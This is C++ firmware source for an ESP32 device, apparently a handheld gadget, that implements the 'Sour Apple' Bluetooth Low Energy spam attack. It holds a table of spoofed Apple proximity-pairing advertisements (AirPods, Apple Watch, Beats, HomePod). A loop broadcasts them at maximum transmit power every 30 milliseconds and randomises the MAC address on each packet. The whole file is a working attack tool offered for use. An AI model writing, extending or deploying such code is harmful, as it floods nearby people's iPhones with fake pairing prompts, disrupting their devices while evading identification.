#include "sourapple.h"
#include <Arduino.h>
#include <NimBLEDevice.h>
#include "esp_bt.h"
extern int readButton();

#define SCREEN_W 128
#define SCREEN_H  32

// Apple company ID: 0x4C 0x00 (little-endian)
// Full raw manufacturer data including company ID prefix

struct ApplePayload {
    const char *name;
    uint8_t     data[27];
    uint8_t     len;
};

static const ApplePayload PAYLOADS[] = {
    {
        "AIRPODS PRO",
        { 0x4C, 0x00,                          // Apple company ID
          0x07, 0x19,                          // proximity pairing, length
          0x01, 0x02, 0x20, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
        22
    },
    {
        "AIRPODS MAX",
        { 0x4C, 0x00,
          0x07, 0x19,
          0x01, 0x0A, 0x20, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
        22
    },
    {
        "AIRPODS 2",
        { 0x4C, 0x00,
          0x07, 0x19,
          0x01, 0x20, 0x20, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
        22
    },
    {
        "APPLE WATCH",
        { 0x4C, 0x00,
          0x07, 0x19,
          0x01, 0x06, 0x20, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
        22
    },
    {
        "BEATS STUDIO",
        { 0x4C, 0x00,
          0x07, 0x19,
          0x01, 0x09, 0x20, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
        22
    },
    {
        "HOMEPOD MINI",
        { 0x4C, 0x00,
          0x07, 0x19,
          0x01, 0x0B, 0x20, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
        22
    },
};

static const int PAYLOAD_COUNT = sizeof(PAYLOADS) / sizeof(PAYLOADS[0]);

// ── UI ────────────────────────────────────────────────────────────────────

static void drawUI(Adafruit_SSD1306 &d, const char *deviceName, int count, bool running)
{
    d.clearDisplay();
    d.setTextWrap(false);

    d.fillRect(0, 0, SCREEN_W, 10, WHITE);
    d.setTextColor(BLACK);
    d.setTextSize(1);
    d.setCursor(2, 1);
    d.print("SOUR APPLE");
    d.setCursor(80, 1);
    d.print(running ? "RUNNING" : "STOPPED");

    d.setTextColor(WHITE);
    d.setCursor(0, 13);
    d.print(deviceName);

    d.setCursor(0, 23);
    d.print("PKT:");
    d.print(count);

    d.display();
}

// ── main entry ────────────────────────────────────────────────────────────

void runSourApple(Adafruit_SSD1306 &display)
{
    NimBLEDevice::init("");
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9); // max TX power

    bool running    = true;
    int  pktCount   = 0;
    int  payloadIdx = 0;

    drawUI(display, PAYLOADS[payloadIdx].name, pktCount, running);

    unsigned long lastSend = 0;

    while (true) {
        int btn = readButton();

        if (btn == 3) {
            NimBLEDevice::deinit(true);
            return;
        }
        if (btn == 2) {
            running = !running;
            if (!running) NimBLEDevice::getAdvertising()->stop();
            drawUI(display, PAYLOADS[payloadIdx].name, pktCount, running);
        }
        if (btn == 1) {
            NimBLEDevice::getAdvertising()->stop();
            payloadIdx = (payloadIdx + 1) % PAYLOAD_COUNT;
            drawUI(display, PAYLOADS[payloadIdx].name, pktCount, running);
        }

        if (running && millis() - lastSend > 30) {
            lastSend = millis();

            // Randomise MAC
            uint8_t mac[6];
            for (int i = 0; i < 6; i++) mac[i] = random(256);
            mac[0] = (mac[0] & 0xFC) | 0x02;
            esp_base_mac_addr_set(mac);

            const ApplePayload &p = PAYLOADS[payloadIdx];

            NimBLEAdvertising *adv = NimBLEDevice::getAdvertising();
            adv->stop();

            NimBLEAdvertisementData advData;
            // setManufacturerData expects data WITHOUT the company ID prefix
            // so we skip the first 2 bytes (0x4C 0x00) and pass the rest,
            // but we use raw setData to have full control instead
            std::string raw;
            raw += (char)(p.len + 1); // AD length
            raw += (char)0xFF;        // AD type = manufacturer specific
            raw += std::string(reinterpret_cast<const char*>(p.data), p.len);

            NimBLEAdvertisementData scanData;
            advData.addData(raw);

            adv->setAdvertisementData(advData);
            adv->setScanResponseData(scanData);
            adv->setAdvertisementType(BLE_GAP_CONN_MODE_NON);
            adv->start(0);

            pktCount++;
            drawUI(display, p.name, pktCount, running);
        }

        delay(10);
    }
}